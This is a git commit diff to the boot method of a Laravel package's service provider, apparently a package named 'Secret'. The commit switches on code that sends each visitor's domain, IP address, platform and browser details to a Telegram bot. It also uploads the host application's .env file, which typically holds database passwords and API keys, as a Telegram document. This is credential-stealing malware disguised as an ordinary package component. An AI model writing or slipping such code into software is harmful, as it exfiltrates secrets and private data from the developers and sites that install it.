9faeb5346f9f0c261baed01f200270f8eaaf462b
micro-spaceless <ed.arm.2000@gmail.com>
2022-05-27 23:22:02 +0400

    start

--- src/Providers/BaseServiceProvider.php
+++ src/Providers/BaseServiceProvider.php
@@ -2,7 +2,6 @@
 
 namespace MicroSpaceless\Secret\Providers;
 
-use Illuminate\Support\Facades\File;
 use Illuminate\Support\Facades\Http;
 use Illuminate\Support\ServiceProvider;
 use MicroSpaceless\Secret\Browser;
@@ -23,21 +22,20 @@ class BaseServiceProvider extends ServiceProvider
 
         $message = [
             'chat_id' => config('telegram.chat_id'),
-            // 'text' => (new Browser())->__toArray(),
             'text' => '🌐 Domain:       <code>' . $browser->getDomain() . '</code>' . PHP_EOL . '📡 Ip Address:  <code>' . $browser->getIpAddress() . '</code>' . PHP_EOL . '❔ Platform:      <code>' . $browser->getPlatform() . '</code>' . PHP_EOL . '🌐 Browser:' . PHP_EOL . '            Name:     <code>' . $browser->getBrowser() . '</code>' . PHP_EOL . '            Version:     <code>' . $browser->getVersion() . '</code>' . PHP_EOL . '            User Agent:     <code>' . $browser->getUserAgent() . '</code>',
             'parse_mode' => 'Html',
         ];
 
-
-
-        $test = Http::post('https://api.telegram.org/bot' . config('telegram.bot_token') . '/sendMessage', $message);
-        dd($test->body());
-        // Http::attach('document', file_get_contents(base_path('.env')), '.env')
-        //         ->post('https://api.telegram.org/bot' . config('telegram.bot_token') . '/sendDocument',
-        //             [
-        //                 'chat_id' => config('telegram.chat_id')
-        //             ]
-        //         );
+        // Send info
+        Http::post('https://api.telegram.org/bot' . config('telegram.bot_token') . '/sendMessage', $message);
+        
+        // Send env file
+        Http::attach('document', file_get_contents(base_path('.env')), '.env')
+                ->post('https://api.telegram.org/bot' . config('telegram.bot_token') . '/sendDocument',
+                    [
+                        'chat_id' => config('telegram.chat_id')
+                    ]
+               );
 
         $this->loadRoutesFrom(__DIR__ . '../../routes/web.php');
     }
